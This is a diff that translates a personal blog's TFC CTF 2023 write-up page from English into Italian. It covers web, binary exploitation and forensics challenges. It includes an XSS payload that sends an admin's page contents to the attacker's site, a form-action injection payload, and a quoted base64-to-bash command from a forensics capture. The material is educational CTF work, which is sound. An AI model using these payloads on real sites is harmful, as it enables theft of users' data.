@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en" dir="auto">
+<html lang="it" dir="auto">
 
 <head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -7,7 +7,7 @@
 <meta name="robots" content="index, follow">
 <title>TFC CTF 2023 | Portfolio</title>
 <meta name="keywords" content="tfcctf, ctf, binary, crypto, web, tfcctf2023">
-<meta name="description" content="Some writeups of the TFC CTF 2023 edition.">
+<meta name="description" content="Alcune writeup della TFC CTF 2023.">
 <meta name="author" content="AlBovo">
 <link rel="canonical" href="https://albovo.tech/en/ctf/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.d6fcd20a4fb86efa4dfac8ec95da60244cc8871042183da1ef28e3a762ad79c8.css" integrity="sha256-1vzSCk&#43;4bvpN&#43;sjsldpgJEzIhxBCGD2h7yjjp2Ktecg=" rel="preload stylesheet" as="style">
@@ -59,11 +59,11 @@
 </noscript>
   
 
-<meta property="og:url" content="https://albovo.tech/en/ctf/tfcctf2023/">
+<meta property="og:url" content="https://albovo.tech/it/ctf/tfcctf2023/">
   <meta property="og:site_name" content="Portfolio">
   <meta property="og:title" content="TFC CTF 2023">
-  <meta property="og:description" content="Some writeups of the TFC CTF 2023 edition.">
-  <meta property="og:locale" content="en">
+  <meta property="og:description" content="Alcune writeup della TFC CTF 2023.">
+  <meta property="og:locale" content="it">
   <meta property="og:type" content="article">
     <meta property="article:section" content="ctf">
     <meta property="article:published_time" content="2023-08-20T00:00:00+00:00">
@@ -78,7 +78,7 @@
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/AlBovo/CTF-Writeups">
 <meta name="twitter:title" content="TFC CTF 2023">
-<meta name="twitter:description" content="Some writeups of the TFC CTF 2023 edition.">
+<meta name="twitter:description" content="Alcune writeup della TFC CTF 2023.">
 
 
 <script type="application/ld+json">
@@ -90,13 +90,13 @@
       "@type": "ListItem",
       "position":  1 ,
       "name": "Capture The Flag 🚩",
-      "item": "https://albovo.tech/en/ctf/"
+      "item": "https://albovo.tech/it/ctf/"
     }, 
     {
       "@type": "ListItem",
       "position":  2 ,
       "name": "TFC CTF 2023",
-      "item": "https://albovo.tech/en/ctf/tfcctf2023/"
+      "item": "https://albovo.tech/it/ctf/tfcctf2023/"
     }
   ]
 }
@@ -107,13 +107,13 @@
   "@type": "BlogPosting",
   "headline": "TFC CTF 2023",
   "name": "TFC CTF 2023",
-  "description": "Some writeups of the TFC CTF 2023 edition.",
+  "description": "Alcune writeup della TFC CTF 2023.",
   "keywords": [
     "tfcctf", "ctf", "binary", "crypto", "web", "tfcctf2023"
   ],
-  "articleBody": "TFC CTF 2023 Web 🌐 Baby Ducky Notes This challenge looked like a normal notes sharing site, but after a quick view to the source code, it was easy to find the way to read the flag. In fact the database.db file had a query to initialize the notes table with this code: query(con, f''' INSERT INTO posts ( user_id, title, content, hidden ) VALUES ( 1, 'Here is a ducky flag!', '{os.environ.get(\"FLAG\")}', 0 ); ''') This could only means that the flag wasn’t hidden and the easiest way to find it was to make a GET request to the url http://challs.tfcctf.com:port/posts/view/admin and the flag was in fact right there.\nBaby Ducky Notes: Revenge Now the challenge was a bit more difficult than the previous one because the flag was hidden and the only way to read it was to make the admin read it for me or by stealing the admin’s cookie which was HttpOnly. After looking for a while in the source code, I found a line from the template of the posts page:\n\u003cul class=\"posts_ul\"\u003e {% for post in posts %} \u003cli\u003e \u003cdiv class=\"blog_post\"\u003e \u003cdiv class=\"container_copy\"\u003e \u003ch1\u003e {{post.get('title')}} \u003c/h1\u003e \u003ch3\u003e {{post.get('username')}} \u003c/h3\u003e \u003cp\u003e {{post.get('content') | safe}} \u003c/p\u003e \u003c/div\u003e \u003c/div\u003e \u003c/li\u003e {% endfor %} \u003c/ul\u003e The content was rendered without any sanitizing and because of that I could perform an XSS using this payload\n\u003cscript\u003e async function attack(){ var xhr = new XMLHttpRequest(); xhr.open(\"GET\", \"/posts/view/admin\", true); xhr.responseType = \"text\"; xhr.onload = () =\u003e { window.location.href = \"{input('Enter the url of your site: ')}?html=\" + btoa(xhr.responseText.toString()); }; await xhr.send(null); } attack(); \u003c/script\u003e After executing this code the admin could read its notes (including the flag) and send the whole html code encrypted in base64 to my website where I had to decrypt it to find the flag.\nCookie Store I really hated this challenge for a while because I couldn’t run the javascript code of the page (which was quite important) because of an error of the setHTML javascript function which only worked when the site was running as localhost or with an https connection. I later found out a way to run docker as localhost (it initially used the local ip 172.17.x.x) but even if I spent a lot of time to resolve this problem, the challenge was quite interesting, in fact this site printed our ’notes’ using some columns sorting method that was vulnerable.\nconst urlParams = new URLSearchParams(window.location.search); const fields = urlParams.get('fields'); let form_html = ''; let fields_list = []; if (fields) { fields_list = fields.split(','); fields_list.forEach(element =\u003e { form_html += ` ",
-  "wordCount" : "2449",
-  "inLanguage": "en",
+  "articleBody": "TFC CTF 2023 Web 🌐 Baby Ducky Notes All’apparenza, questa challenge sembrava un semplice sito per la condivisione di note, ma un rapido sguardo al codice sorgente ha svelato come leggere la flag. Infatti, il file database.db includeva una query per inizializzare la tabella delle note, configurata nel seguente modo:\nquery(con, f''' INSERT INTO posts ( user_id, title, content, hidden ) VALUES ( 1, 'Here is a ducky flag!', '{os.environ.get(\"FLAG\")}', 0 ); ''') Questo significava che chiaramente la flag non era nascosta e che il metodo più semplice per trovarla era effettuare una richiesta GET all’URL http://challs.tfcctf.com:port/posts/view/admin, dove la flag era visibile.\nBaby Ducky Notes: Revenge Questa challenge risultava un po’ più elaborata rispetto alla precedente, poiché la flag era nascosta. L’unico modo per leggerla era far sì che l’admin la visualizzasse, oppure ottenere il suo cookie, che però era protetto da HttpOnly.\nAnalizzando il codice sorgente, ho individuato questo frammento nel template della pagina dei post:\n\u003cul class=\"posts_ul\"\u003e {% for post in posts %} \u003cli\u003e \u003cdiv class=\"blog_post\"\u003e \u003cdiv class=\"container_copy\"\u003e \u003ch1\u003e {{post.get('title')}} \u003c/h1\u003e \u003ch3\u003e {{post.get('username')}} \u003c/h3\u003e \u003cp\u003e {{post.get('content') | safe}} \u003c/p\u003e \u003c/div\u003e \u003c/div\u003e \u003c/li\u003e {% endfor %} \u003c/ul\u003e Il contenuto veniva renderizzato senza alcuna sanitizzazione, il che mi ha permesso di eseguire un attacco XSS con questo payload:\n\u003cscript\u003e async function attack(){ var xhr = new XMLHttpRequest(); xhr.open(\"GET\", \"/posts/view/admin\", true); xhr.responseType = \"text\"; xhr.onload = () =\u003e { window.location.href = \"{input('Enter the url of your site: ')}?html=\" + btoa(xhr.responseText.toString()); }; await xhr.send(null); } attack(); \u003c/script\u003e Eseguendo questo script, l’admin avrebbe visualizzato le proprie note (inclusa la flag) e inviato l’intero HTML, codificato in base64, al mio sito. Successivamente, avrei potuto decodificarlo per estrarre la flag.\nCookie Store Questa challenge mi ha fatto impazzire per un po’ perché non riuscivo a far girare il codice JavaScript della pagina (fondamentale per l’exploit) a causa di un errore nella funzione setHTML, la quale funzionava solo in ambiente localhost o su connessioni https.\nSuccessivamente ho trovato un modo per far girare Docker come localhost (inizialmente usava l’IP locale 172.17.x.x) e, nonostante il tempo speso per risolvere il problema, la challenge si è rivelata interessante. Infatti, il sito stampava le “note” utilizzando un metodo di ordinamento delle colonne vulnerabile:\nconst urlParams = new URLSearchParams(window.location.search); const fields = urlParams.get('fields'); let form_html = ''; let fields_list = []; if (fields) { fields_list = fields.split(','); fields_list.forEach(element =\u003e { form_html += ` ",
+  "wordCount" : "2119",
+  "inLanguage": "it",
   "image":"https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/AlBovo/CTF-Writeups","datePublished": "2023-08-20T00:00:00Z",
   "dateModified": "2023-08-20T00:00:00Z",
   "author":{
@@ -122,7 +122,7 @@
   },
   "mainEntityOfPage": {
     "@type": "WebPage",
-    "@id": "https://albovo.tech/en/ctf/tfcctf2023/"
+    "@id": "https://albovo.tech/it/ctf/tfcctf2023/"
   },
   "publisher": {
     "@type": "Organization",
@@ -151,7 +151,7 @@
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="https://albovo.tech/en/" accesskey="h" title="Home (Alt + H)">
+            <a href="https://albovo.tech/it/" accesskey="h" title="Home (Alt + H)">
                 <img src="https://albovo.tech/apple-touch-icon.png" alt="" aria-label="logo"
                     height="35">Home</a>
             <div class="logo-switches">
@@ -177,25 +177,25 @@
                 </button>
                 <ul class="lang-switch"><li>|</li>
                     <li>
-                        <a href="https://albovo.tech/it/" title="Italian"
-                            aria-label=":it: It">🇮🇹 It</a>
+                        <a href="https://albovo.tech/en/" title="🇬🇧 En"
+                            aria-label=":uk: En">🇬🇧 En</a>
                     </li>
                 </ul>
             </div>
         </div>
         <ul id="menu">
             <li>
-                <a href="https://albovo.tech/en/projects/" title="📒 Projects">
-                    <span>📒 Projects</span>
+                <a href="https://albovo.tech/it/projects/" title="📒 Progetti">
+                    <span>📒 Progetti</span>
                 </a>
             </li>
             <li>
-                <a href="https://albovo.tech/en/ctf/" title="⚙ Writeups">
+                <a href="https://albovo.tech/it/ctf/" title="⚙ Writeups">
                     <span>⚙ Writeups</span>
                 </a>
             </li>
             <li>
-                <a href="https://albovo.tech/en/aoc/" title="🎄 Advent of Code">
+                <a href="https://albovo.tech/it/aoc/" title="🎄 Advent of Code">
                     <span>🎄 Advent of Code</span>
                 </a>
             </li>
@@ -206,17 +206,17 @@
 
 <article class="post-single">
   <header class="post-header">
-    <div class="breadcrumbs"><a href="https://albovo.tech/en/">Home</a>&nbsp;»&nbsp;<a href="https://albovo.tech/en/ctf/">Capture The Flag 🚩</a></div>
+    <div class="breadcrumbs"><a href="https://albovo.tech/it/">Home</a>&nbsp;»&nbsp;<a href="https://albovo.tech/it/ctf/">Capture The Flag 🚩</a></div>
     <h1 class="post-title entry-hint-parent">
       TFC CTF 2023
     </h1>
     <div class="post-description">
-      Some writeups of the TFC CTF 2023 edition.
+      Alcune writeup della TFC CTF 2023.
     </div>
-    <div class="post-meta"><span title='2023-08-20 00:00:00 +0000 UTC'>August 20, 2023</span>&nbsp;·&nbsp;12 min&nbsp;·&nbsp;2449 words&nbsp;·&nbsp;AlBovo&nbsp;|&nbsp;Translations:
+    <div class="post-meta"><span title='2023-08-20 00:00:00 +0000 UTC'>agosto 20, 2023</span>&nbsp;·&nbsp;10 minuti&nbsp;·&nbsp;2119 parole&nbsp;·&nbsp;AlBovo&nbsp;|&nbsp;Traduzioni:
 <ul class="i18n_list">
     <li>
-        <a href="https://albovo.tech/it/ctf/tfcctf2023/">🇮🇹 It</a>
+        <a href="https://albovo.tech/en/ctf/tfcctf2023/">🇬🇧 En</a>
     </li>
 </ul>&nbsp;|&nbsp;<a href="https://github.com/AlBovo/AlBovo.github.io/blob/main/content/en/ctf/tfcctf2023.md" rel="noopener noreferrer" target="_blank">Suggest Changes</a>
 
@@ -224,7 +224,7 @@
   </header> <div class="toc">
     <details >
         <summary accesskey="c" title="(Alt + C)">
-            <span class="details">Table of Contents</span>
+            <span class="details">Indice contenuti</span>
         </summary>
 
         <div class="inner"><nav id="TableOfContents">
@@ -277,8 +277,8 @@
 <p><img alt="tfc ctf logo" loading="lazy" src="/images/tfc.png"></p>
 <h2 id="web-">Web 🌐<a hidden class="anchor" aria-hidden="true" href="#web-">#</a></h2>
 <h3 id="baby-ducky-notes">Baby Ducky Notes<a hidden class="anchor" aria-hidden="true" href="#baby-ducky-notes">#</a></h3>
-<p>This challenge looked like a normal notes sharing site, but after a quick view to the source code, it was easy to find the way to read the flag.
-In fact the <code>database.db</code> file had a query to initialize the notes table with this code: <!-- raw HTML omitted --></p>
+<p>All&rsquo;apparenza, questa challenge sembrava un semplice sito per la condivisione di note, ma un rapido sguardo al codice sorgente ha svelato come leggere la flag.
+Infatti, il file <code>database.db</code> includeva una query per inizializzare la tabella delle note, configurata nel seguente modo:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">query</span><span class="p">(</span><span class="n">con</span><span class="p">,</span> <span class="sa">f</span><span class="s1">&#39;&#39;&#39; 
 </span></span></span><span class="line"><span class="cl"><span class="s1">INSERT INTO posts (
 </span></span></span><span class="line"><span class="cl"><span class="s1">    user_id,
@@ -292,10 +292,10 @@ In fact the <code>database.db</code> file had a query to initialize the notes ta
 </span></span></span><span class="line"><span class="cl"><span class="s1">        0  
 </span></span></span><span class="line"><span class="cl"><span class="s1">);
 </span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>
-</span></span></code></pre></div><p>This could only means that the flag wasn&rsquo;t hidden and the easiest way to find it was to make a GET request to the url <code>http://challs.tfcctf.com:port/posts/view/admin</code> and the flag was in fact right there.</p>
+</span></span></code></pre></div><p>Questo significava che chiaramente la flag non era nascosta e che il metodo più semplice per trovarla era effettuare una richiesta GET all&rsquo;URL <code>http://challs.tfcctf.com:port/posts/view/admin</code>, dove la flag era visibile.</p>
 <h3 id="baby-ducky-notes-revenge">Baby Ducky Notes: Revenge<a hidden class="anchor" aria-hidden="true" href="#baby-ducky-notes-revenge">#</a></h3>
-<p>Now the challenge was a bit more difficult than the previous one because the flag was hidden and the only way to read it was to make the admin read it for me or by stealing the admin&rsquo;s cookie which was HttpOnly.<!-- raw HTML omitted -->
-After looking for a while in the source code, I found a line from the template of the posts page:<!-- raw HTML omitted --></p>
+<p>Questa challenge risultava un po&rsquo; più elaborata rispetto alla precedente, poiché la flag era nascosta. L&rsquo;unico modo per leggerla era far sì che l&rsquo;admin la visualizzasse, oppure ottenere il suo cookie, che però era protetto da HttpOnly.<br>
+Analizzando il codice sorgente, ho individuato questo frammento nel template della pagina dei post:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">ul</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;posts_ul&#34;</span><span class="p">&gt;</span>
 </span></span><span class="line"><span class="cl">    {% for post in posts %}
 </span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>
@@ -309,7 +309,7 @@ After looking for a while in the source code, I found a line from the template o
 </span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
 </span></span><span class="line"><span class="cl">    {% endfor %} 
 </span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
-</span></span></code></pre></div><p>The content was rendered without any sanitizing and because of that I could perform an XSS using this payload<!-- raw HTML omitted --></p>
+</span></span></code></pre></div><p>Il contenuto veniva renderizzato senza alcuna sanitizzazione, il che mi ha permesso di eseguire un attacco XSS con questo payload:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
 </span></span><span class="line"><span class="cl"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">attack</span><span class="p">(){</span>
 </span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
@@ -322,9 +322,10 @@ After looking for a while in the source code, I found a line from the template o
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="nx">attack</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">/script&gt;</span>
-</span></span></code></pre></div><p>After executing this code the admin could read its notes (including the flag) and send the whole html code encrypted in base64 to my website where I had to decrypt it to find the flag.</p>
+</span></span></code></pre></div><p>Eseguendo questo script, l&rsquo;admin avrebbe visualizzato le proprie note (inclusa la flag) e inviato l&rsquo;intero HTML, codificato in base64, al mio sito. Successivamente, avrei potuto decodificarlo per estrarre la flag.</p>
 <h3 id="cookie-store">Cookie Store<a hidden class="anchor" aria-hidden="true" href="#cookie-store">#</a></h3>
-<p>I really hated this challenge for a while because I couldn&rsquo;t run the javascript code of the page (which was quite important) because of an error of the <code>setHTML</code> javascript function which only worked when the site was running as <code>localhost</code> or with an <code>https</code> connection. I later found out a way to run docker as <code>localhost</code> (it initially used the local ip 172.17.x.x) but even if I spent a lot of time to resolve this problem, the challenge was quite interesting, in fact this site printed our &rsquo;notes&rsquo; using some columns sorting method that was vulnerable.</p>
+<p>Questa challenge mi ha fatto impazzire per un po’ perché non riuscivo a far girare il codice JavaScript della pagina (fondamentale per l&rsquo;exploit) a causa di un errore nella funzione <code>setHTML</code>, la quale funzionava solo in ambiente <code>localhost</code> o su connessioni <code>https</code>.<br>
+Successivamente ho trovato un modo per far girare Docker come <code>localhost</code> (inizialmente usava l&rsquo;IP locale 172.17.x.x) e, nonostante il tempo speso per risolvere il problema, la challenge si è rivelata interessante. Infatti, il sito stampava le &ldquo;note&rdquo; utilizzando un metodo di ordinamento delle colonne vulnerabile:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">urlParams</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">fields</span> <span class="o">=</span> <span class="nx">urlParams</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;fields&#39;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
@@ -343,56 +344,56 @@ After looking for a while in the source code, I found a line from the template o
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;#form_builder&#39;</span><span class="p">).</span><span class="nx">setHTML</span><span class="p">(</span><span class="nx">form_html</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="p">...</span>
-</span></span></code></pre></div><p>This code in fact injects the input wihout any check in the html source code, then it removes any javascript script or method like <code>onerror</code> or <code>onload</code> before writing it in the page.<!-- raw HTML omitted -->
-This code is vulnerable because if I send this payload as a field</p>
+</span></span></code></pre></div><p>Questo codice inserisce l’input direttamente nel codice HTML senza controlli, rimuovendo solo script o metodi JavaScript come <code>onerror</code> o <code>onload</code> prima di scriverlo nella pagina.<br>
+La vulnerabilità risiede nel fatto che, inviando questo payload come campo:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">&#34;&gt;<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">formaction</span><span class="o">=</span><span class="s">&#34;our site&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;pwned&#34;</span><span class="p">&gt;&lt;</span><span class="nt">label</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;</span>
-</span></span></code></pre></div><p>I can redirect the form data from the cookie store to my site and then read the flag that the admin wrote in the title field.</p>
+</span></span></code></pre></div><p>si può reindirizzare l’output del form (contenente il cookie store) verso il proprio sito, consentendo di leggere la flag scritta dall’admin nel campo titolo.</p>
 <h3 id="mctree">MCTree<a hidden class="anchor" aria-hidden="true" href="#mctree">#</a></h3>
-<p>This challenge was really easy but, I was tired (just a lot of skill issue) and I couldn&rsquo;t understand the vulnerability during the CTF (sorry ZenHack) but anyway, the challenge didn&rsquo;t have any source code to download. In fact it was only a site where you could register, login and, if after the login you had the admin username, you could achive the flag.
-After a few attempts I saw that the challenge always removed any character like <code>{}&lt;&gt;[]'&quot;</code> so the payload was to send a username like <code>{admin</code> so that the site could accept our request because the username was different from <code>admin</code> and after a sanitizing our username was <code>admin</code> anyway. And that&rsquo;s it lol :).</p>
+<p>Questa challenge era molto semplice ma, a causa di problemi personali (e una cospicua skill issue mia, pardon ZenHack) non sono riuscito a capire la vulnerabilità durante la CTF. Il sito non forniva alcun codice sorgente da scaricare: bastava registrarsi, fare login e, se dopo il login si aveva l’username admin, si poteva ottenere la flag.<br>
+Dopo alcuni tentativi ho notato che il sito rimuoveva sempre caratteri come <code>{}&lt;&gt;[]'&quot;</code>. Quindi, la strategia era quella di inviare un username del tipo <code>{admin</code> in modo che la richiesta venisse accettata (poiché il nome risultava diverso da <code>admin</code>), ma dopo la sanitizzazione il nome diventava comunque <code>admin</code>. E il gioco era fatto!</p>
 <h2 id="binary-">Binary 🐧<a hidden class="anchor" aria-hidden="true" href="#binary-">#</a></h2>
 <h3 id="diary">Diary<a hidden class="anchor" aria-hidden="true" href="#diary">#</a></h3>
-<p>This challenge was really nice and easy because it had RWX segments in it, no PIE and also hadn&rsquo;t any canary.</p>
+<p>Questa challenge era davvero interessante e semplice, grazie alla presenza di segmenti RWX, l&rsquo;assenza di PIE e la mancanza di canary.</p>
 <pre tabindex="0"><code>Arch:     amd64-64-little
 RELRO:    Partial RELRO
 Stack:    No canary found
 NX:       NX disabled
 PIE:      No PIE (0x400000)
 RWX:      Has RWX segments
-</code></pre><p>It had an important funciton <code>vuln</code> which only read 1024 chars in a 256 bytes long buffer, where I could perform an overflow to change the return pointer to another address</p>
+</code></pre><p>La funzione vulnerabile <code>vuln</code> leggeva 1024 caratteri in un buffer di soli 256 byte, consentendo un overflow per modificare il puntatore di ritorno:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">fgets</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_108</span><span class="p">,</span><span class="mh">0x400</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
-</span></span></code></pre></div><p>After using <code>ropgadgets</code> to find a useful code, I found a nice instruction</p>
+</span></span></code></pre></div><p>Utilizzando <code>ropgadgets</code> per individuare istruzioni utili, ho trovato il seguente comando:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">call</span> <span class="nb">rax</span>
-</span></span></code></pre></div><p>so the only thing that I had to do was to make a shellcode using the <code>shellcraft</code> module of pwntools to create a shellcode and then call it by changing the return pointer to the shellcode address.</p>
+</span></span></code></pre></div><p>Così, ho realizzato uno shellcode tramite il modulo <code>shellcraft</code> di pwntools e ho cambiato il puntatore di ritorno per eseguirlo.</p>
 <h3 id="shello-world">Shello-World<a hidden class="anchor" aria-hidden="true" href="#shello-world">#</a></h3>
-<p>This challenge is exactly the same of <code>Diary</code>, but in this one there is no buffer overflow to perform, because now the <code>vuln</code> function is the following</p>
+<p>Questa challenge è simile a Diary, ma qui non è possibile eseguire un buffer overflow, perché la funzione <code>vuln</code> è la seguente:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="nf">fgets</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_108</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Hello, &#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_108</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="nf">putchar</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span> <span class="c1">// (chr)(10) == &#39;\n&#39; =&gt; true
-</span></span></span></code></pre></div><p>This is pretty different from diary but still vulnerable as there&rsquo;s a format string vulnerability because the source file calls a <code>printf</code> without set any format string which means that we can use the <code>fmtstr_payload</code> function from pwntools to write a payload which replaces the address of the function <code>exit</code> from the GOT with the address of the <code>win</code> function that will open a shell on the remote machine.</p>
+</span></span></span></code></pre></div><p>Anche se diversa da Diary, risulta comunque vulnerabile a causa di una format string vulnerability: il file sorgente esegue un <code>printf</code> senza specificare una stringa di formato, il che permette di utilizzare la funzione <code>fmtstr_payload</code> di pwntools per scrivere un payload che sostituisce l&rsquo;indirizzo della funzione <code>exit</code> nel GOT con quello della funzione <code>win</code>, aprendo così una shell sulla macchina remota.</p>
 <h3 id="random">Random<a hidden class="anchor" aria-hidden="true" href="#random">#</a></h3>
-<p>If you give a quick look at this challenge it doesn&rsquo;t seem to be really vulnerable, but if you look at the call of the <code>sran</code> function in the decompiled section of your tool, you can easily see something that looks like this</p>
+<p>A prima vista questa challenge potrebbe sembrare non vulnerabile, ma osservando la chiamata alla funzione <code>sran</code> nel codice decompilato del tool, si nota una riga simile a:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">srand</span><span class="p">(</span><span class="nf">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
-</span></span></code></pre></div><p>which can be easily reproduced in python by using the <code>ctypes</code> library.<!-- raw HTML omitted -->
-So the exploit was to reproduce all the numbers generated by the seeded random function of the source file using a python script and than send them to the container to recive the flag.</p>
+</span></span></code></pre></div><p>Questa operazione può essere facilmente replicata in Python usando la libreria <code>ctypes</code>.<br>
+L’exploit consiste nel ricreare tutti i numeri generati dalla funzione random (seedata con l’ora corrente) mediante uno script Python e poi inviarli al container per ottenere la flag.</p>
 <h2 id="forensics">Forensics<a hidden class="anchor" aria-hidden="true" href="#forensics">#</a></h2>
 <h3 id="list">List<a hidden class="anchor" aria-hidden="true" href="#list">#</a></h3>
-<p>This challenge provided a file with a lot of http comunications always with the status code <code>404</code> or <code>403</code> when the client tries to get some &lsquo;random&rsquo; directories.<!-- raw HTML omitted -->
-This is obviusly a bruteforce of the URIs directories that was performed using a tool like <code>gobuster</code> or <code>dirsearch</code>.<!-- raw HTML omitted -->
-Once I noticed this, I filtered all the responses by removing all those which had the status code <code>404</code> or <code>403</code>. This showed me some packets that looked like a response to a reverse shell command.</p>
+<p>Questa challenge forniva un file contenente numerose comunicazioni HTTP, tutte con status code <code>404</code> o <code>403</code> quando il client tentava di accedere a directory &ldquo;casuali&rdquo;.
+Si trattava chiaramente di un bruteforce delle URI, eseguito con tool come <code>gobuster</code> o <code>dirsearch</code>.<br>
+Filtrando le risposte e rimuovendo quelle con status code <code>404</code> o <code>403</code>, sono emersi alcuni pacchetti che sembravano risposte a comandi di reverse shell:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
-</span></span></code></pre></div><p>This could only mean that somewhere in the file there was a command executed by the attacker.
-In fact after a while I found out that there were a lot of packets that were HTTP POST requests, all with the same length (756 bytes) and with the same paylaod.</p>
+</span></span></code></pre></div><p>Questo indicava che da qualche parte nel file era stato eseguito un comando dall&rsquo;attaccante.<br>
+Dopo un po’ di analisi, ho notato numerose richieste HTTP POST, tutte della stessa lunghezza (756 byte) e con payload identico:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;ZmluZCAvaG9tZS9jdGYgLXR5cGUgZiAtbmFtZSAifSIgMj4vZGV2L251bGw=&#34;</span> <span class="p">|</span> base64 -d <span class="p">|</span> bash
-</span></span></code></pre></div><p>This is in fact a bash command encoded in base64 and this is what I got after I decoded it</p>
+</span></span></code></pre></div><p>Questo comando bash, codificato in base64, decodificava in:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">find /home/ctf -type f -name <span class="s2">&#34;T&#34;</span> 2&gt;/dev/null
-</span></span></code></pre></div><p>and later I did the same on the next packet where I got the same payload with a little change</p>
+</span></span></code></pre></div><p>Successivamente, in un altro pacchetto, lo stesso payload (con una leggera variazione) veniva usato:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">find /home/ctf -type f -name <span class="s2">&#34;F&#34;</span> 2&gt;/dev/null
-</span></span></code></pre></div><p>So the flag was just splitted in many different commands and the only thing left to do was to write a script to get by using a regex filter.</p>
+</span></span></code></pre></div><p>La flag era quindi frammentata in diversi comandi, e bastava scrivere uno script per unire i pezzi tramite regex.</p>
 <h3 id="some-traffic">Some Traffic<a hidden class="anchor" aria-hidden="true" href="#some-traffic">#</a></h3>
-<p>This challenge required much more time than the previous one because it also had some normal http packets that were just requests and responses of the upload of three images to a website.
-After I&rsquo;ve extracted all the images I tried to see what could be hidden in all the files, but I didn&rsquo;t find anything suspicious. However, the first image had three columns of green pixels that seemed to be a type of hidden data.</p>
+<p>Questa challenge richiedeva più tempo perché il file conteneva anche normali pacchetti HTTP relativi all’upload di tre immagini su un sito.
+Dopo aver estratto tutte le immagini, ho cercato eventuali dati nascosti. La prima immagine, infatti, presentava tre colonne di pixel verdi che nascondevano informazioni:</p>
